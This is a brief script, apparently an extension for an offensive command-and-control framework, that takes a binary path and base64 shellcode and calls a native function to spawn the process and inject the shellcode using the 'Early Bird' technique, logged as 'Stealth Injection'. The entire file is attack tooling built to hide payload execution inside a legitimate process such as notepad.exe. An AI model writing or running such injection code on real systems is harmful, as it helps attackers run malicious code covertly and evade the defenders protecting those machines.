// Example: extension load inject_earlybird "notepad.exe" "buf..."

print_log("Starting Stealth Injection (Early Bird)...");

if args.len() < 2 {
    return "Usage: inject_stealth <binary_path> <base64_shellcode>";
}

let bin_path = args[0];
let payload = args[1];

let res = native_inject_spawn(bin_path, payload);
return res;
